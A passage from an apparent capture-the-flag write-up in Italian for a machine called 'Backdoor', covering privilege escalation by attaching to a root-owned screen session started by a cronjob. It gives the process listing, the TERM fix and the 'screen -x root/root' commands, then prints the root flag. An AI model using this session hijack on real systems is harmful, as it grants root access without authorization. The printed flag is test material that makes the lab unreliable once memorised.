root        6908  0.0  0.1   7048  2864 pts/1    S+   19:43   0:00          _ screen -x root root
root        5912  0.0  0.1   7084  2672 ?        Ss   19:37   0:00 SCREEN -dmS root

    #+end_example

Viene segnalata una vulnerabilità di **screen** che runna come un **cronjob** da root.
La vulnerabilità consiste nell'opzione **-x** di screen che permette di attaccarsi ad uno screen non detached.
E, come visto, ce n'è uno che runna da root con cronjob.

*** exploit screen -x
    #+begin_example
screen -x root/root
No terminal attached
echo $TERM
dumb
export TERM=xterm
screen -x root/root
    #+end_example

** root
    #+begin_example
root@Backdoor:~# cat root.txt
82c2bc8ce79b5a4bb34bf4aecde184ba
    #+end_example
**** root flag
     #+begin_example
root.txt:82c2bc8ce79b5a4bb34bf4aecde184ba     
     #+end_example

